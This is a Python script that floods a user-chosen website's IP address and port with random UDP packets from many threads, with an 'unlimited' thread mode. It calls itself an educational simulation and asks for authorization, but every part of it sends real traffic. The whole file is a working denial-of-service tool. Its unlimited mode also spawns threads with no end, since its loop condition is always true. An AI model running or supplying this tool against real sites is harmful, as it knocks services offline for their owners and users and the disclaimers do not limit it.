import threading
import socket
import random
import time
from datetime import datetime
from urllib.parse import urlparse

def log_message(message):
    """Logs messages with timestamps."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def extract_ip_and_port(url):
    """Extracts the IP address and default port from a website URL."""
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc or parsed_url.path
        ip_address = socket.gethostbyname(hostname)
        
        # Detect port based on scheme
        port = 443 if parsed_url.scheme == "https" else 80
        return ip_address, port
    except Exception as e:
        log_message(f"Error extracting IP/port from URL: {e}")
        return None, None

def generate_payload(packet_size):
    """Generates a random payload for the UDP packet."""
    return random._urandom(packet_size)

def udp_flood(target_ip, target_port, packet_size, duration, threads_count):
    """Simulates a UDP flood for educational purposes."""
    log_message(f"Simulating UDP flood on {target_ip}:{target_port} with {threads_count} threads for {duration} seconds.")

    def attack_thread():
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = generate_payload(packet_size)
        end_time = time.time() + duration

        while time.time() < end_time:
            try:
                udp_socket.sendto(payload, (target_ip, target_port))
                log_message(f"Packet sent to {target_ip}:{target_port}")
            except Exception as e:
                log_message(f"Error sending packet: {e}")
                break

    # Launch threads (unlimited mode if threads_count is 0)
    threads = []
    if threads_count == 0:
        log_message("Unlimited thread mode activated. Use Ctrl+C to stop.")
        while time.time() < time.time() + duration:
            thread = threading.Thread(target=attack_thread)
            threads.append(thread)
            thread.start()
    else:
        for _ in range(threads_count):
            thread = threading.Thread(target=attack_thread)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    log_message("Simulation completed.")

def main():
    """Main function to execute the UDP flood simulation."""
    log_message("UDP Flood Simulation Script (Educational Purposes Only)")
    log_message("Ensure you have explicit permission before testing any system.")

    website_url = input("Enter the target website URL (authorized systems only): ").strip()
    target_ip, default_port = extract_ip_and_port(website_url)
    if not target_ip:
        log_message("Invalid website URL or unable to resolve IP address.")
        return

    try:
        use_default_port = input(f"Use default port {default_port}? (y/n): ").strip().lower() == 'y'
        target_port = default_port if use_default_port else int(input("Enter the target port: ").strip())
        packet_size = input("Enter the packet size (bytes, default 1024): ").strip()
        packet_size = int(packet_size) if packet_size else 1024
        duration = int(input("Enter the duration of the simulation (seconds): ").strip())
        threads_count = int(input("Enter the number of threads (0 for unlimited): ").strip())

        if target_port <= 0 or target_port > 65535:
            raise ValueError("Port number must be between 1 and 65535.")
        if packet_size <= 0 or duration <= 0 or threads_count < 0:
            raise ValueError("All inputs must be positive numbers.")

        udp_flood(target_ip, target_port, packet_size, duration, threads_count)
    except ValueError as e:
        log_message(f"Input error: {e}")
    except KeyboardInterrupt:
        log_message("Simulation aborted by user.")
    except Exception as e:
        log_message(f"Unexpected error: {e}")

if __name__ == "__main__":
    main()